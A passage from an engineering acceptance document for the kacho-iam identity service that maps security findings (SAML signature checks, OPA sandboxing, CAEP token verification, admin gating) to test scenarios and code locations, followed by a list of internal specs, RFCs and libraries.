| SAML SP-initiated (we issue AuthnRequest); W3.1 implements IdP-initiated ACS only (with AuthnRequest tracking for replay-protection — IDP-initiated flow with later validation) | future SAML sub-phase if SP-initiated needed |

---

## 11. Traceability — finding-id ↔ scenario-id ↔ source-line

> **Source-line precision note**: line numbers verified against `main`-branch state as of 2026-05-24 (commit `9b36fa1`). Impl-author SHOULD re-verify at branch-creation time — refactors may shift them by ±5.

| Finding (rem. plan §1.3) | GWT Scenarios | Code-target (kacho-iam, post-W3.1) | Test-name |
|---|---|---|---|
| **#21** (P0 OPA scope-allowlist) | W3.1-21-HAPPY, W3.1-21-UNKNOWN, W3.1-21-EMPTY-FAIL-CLOSED | `internal/service/opa_scope/allowlist.go`, `internal/repo/opa_scope_repo.go`, `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest`, `migrations/00XX_opa_scope_allowlist.sql` | `Test_OpaScope_*`, newman `OPA-SCOPE-*` |
| **#23** (P1 CheckRelation context) | W3.1-23-HAPPY, W3.1-23-CONTEXT-DENY, W3.1-23-MALFORMED-SIZE, W3.1-23-MALFORMED-VALUE | `internal/service/authorize_service.go::CheckRelation`, `internal/apps/kacho/api/internal_iam/handler.go::Check`, FGA model `bootstrap-model.fga` (Condition definitions) | `Test_CheckRelation_Context_*`, newman `CHECKRELATION-CTX-*` |
| **#25** (P0 ReloadModel auth) | W3.1-25-HAPPY, W3.1-25-ANON-DENY, W3.1-25-NON-ADMIN | `internal/apps/kacho/api/internal_authorize/handler.go::ReloadModel` (cluster-admin gate via `iam.IsClusterAdmin`) | `Test_ReloadModel_*`, newman `RELOAD-MODEL-*` |
| **#26** (P0 RunRegoTest sandbox) | W3.1-26-HAPPY, W3.1-26-FORBIDDEN-HTTP, W3.1-26-FORBIDDEN-TABLE, W3.1-26-ALLOWED-PURE, W3.1-26-CPU-TIMEOUT, W3.1-26-UNKNOWN-IMPORT, W3.1-26-NON-ADMIN | `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest` (sandbox + cluster-admin + import-allowlist), `kacho/cloud/iam/v1/internal_authorize_service.proto` (additive fields) | `Test_RunRegoTest_*`, newman `RUNREGOTEST-*` |
| **#40** (P0 SAML verify) | W3.1-40-HAPPY, W3.1-40-TAMPERED, W3.1-40-NO-ASSERTION-SIG, W3.1-40-EXPIRED, W3.1-40-NOTBEFORE-FUTURE, W3.1-40-REPLAY, W3.1-40-WEAK-ALG, W3.1-40-WRONG-RECIPIENT, W3.1-40-WRONG-AUDIENCE | `internal/apps/kacho/api/saml/sp_handler.go` (crewjam/saml wiring + `postgresReplayTracker`), `migrations/00XX_saml_request_state.sql` | `Test_SAML_*`, newman `SAML-*` (with fixture-based assertions per §7.2) |
| **#42** (P1 CAEP SET ingress verify) | W3.1-42-VERIFY-OK, W3.1-42-VERIFY-BADSIG, W3.1-42-UNKNOWN-KID, W3.1-42-WEAK-ALG, W3.1-42-EXPIRED-CACHE, W3.1-42-NO-LEAK | `internal/service/jwks_verifier/verifier.go`, `internal/handler/iamhooks/caep_ingress_handler.go::parseSETBody` (replace «base64-decode without verify»), `migrations/00XX_iam_trusted_idp_jwks_cache.sql` | `Test_JwksVerifier_*`, `Test_CAEP_Ingress_*`, newman `CAEP-INGRESS-*` |

---

## 12. Ссылки

- Workspace правила: `../../CLAUDE.md` (запреты #1/#2/#6/#10/#11/#12; §«Инфра-чувствительные данные»; vault discipline)
- IAM-specific: `../../project/kacho-iam/CLAUDE.md`
- Source of findings: `../superpowers/plans/2026-05-21-iam-authz-review-remediation-plan.md` §1.3 Chunk 5 (items 5.1 #21, 5.2 #42, 5.3 #23, 5.4 #25, 5.5 #40, 5.8 #26 — items 5.6 [#41], 5.7 [#20], 5.9 [#24-follow-up] excluded per §0.1)
- Master plan: `../superpowers/plans/2026-05-23-iam-prod-ready-master.md` §W3 row (source-of-truth for W3.1 scope: «#21/#23/#25/#26/#40/#42» — note: #41 NOT in row)
- Predecessor acceptance docs:
  - `sub-phase-W1.6-remediation-chunk2-in-service-authz-acceptance.md` (anti-anon allowlist primitive used for #25 #26 baseline)
  - W2.B B.1 SAML ACS guard (501) — predecessor; W3.1 replaces guard with real verify
  - W2.B B.2 SCIM endpoints + Basic-auth (#41 closed there per scope split) — predecessor
  - W2.B B.8 CAEP egress sign + JWKS publication for OUR keys — predecessor (provides infrastructure parity context for W3.1 #42 ingress verify direction)
  - W2.A catalog/permissions unification — predecessor; W3.1 #21 references catalogued scopes
- Revision context: `KAC-170-acceptance-review-report.md` (v1 review findings; Option Y ratified)
- Specs:
  - `00-overview-and-scope.md`
  - `01-architecture-and-services.md` (Internal vs public listener separation per §«Запреты» #6)
  - `02-data-model-and-conventions.md` (envelope, error-codes table; W3.1 follows YC-style error texts: «Illegal argument scope: ...», «authentication required»)
  - `03-deployment-and-operations.md`
  - `04-roadmap-and-phasing.md`
- External standards referenced:
  - **RFC 7517** — JSON Web Key (JWK) and Key Set (JWKS) — JWKS endpoint format
  - **RFC 7515** — JSON Web Signature (JWS) — SET signing format
  - **RFC 7518** — JSON Web Algorithms (JWA) — RSA/ECDSA alg identifiers; private/public field separation
  - **RFC 8417** — Security Event Token (SET) — CAEP payload format
  - **OASIS SAML 2.0 Core** — AuthnResponse / Assertion verification rules
  - **OpenFGA Conditions** — https://openfga.dev/docs/modeling/conditions (Conditions feature for ABAC-style policy)
- Libraries planned:
  - **`crewjam/saml`** v0.4.x — SAML 2.0 SP impl with replay-tracker hook (DEC-W3.1-3 with POC-verify caveat for `AcceptedResponseSigningAlgorithms` API)
  - **`golang-jwt/jwt/v5`** — JWS verify for CAEP SET ingress
  - **`open-policy-agent/opa`** (Go SDK) — Rego AST walk + sandboxed eval (no `RegoMaxMemoryBytes` available — DEC-W3.1-2 honest framing)
- Reference impl (parity для cluster-admin gate): `internal/service/cluster_admin/check.go` (existing `IsClusterAdmin` helper from W1.5 BG.ApproveB path)
- Reference impl (parity для existing `oidc_jwks_keys` rotation — W2.B B.8 territory, NOT modified by W3.1): `kacho-iam/internal/migrations/0014_kac127_scim_gdpr_reviews_jwks.sql` (defines existing `oidc_jwks_keys` table with `partial UNIQUE WHERE current=true` — verified 2026-05-24; W3.1 references this only to confirm no duplication)
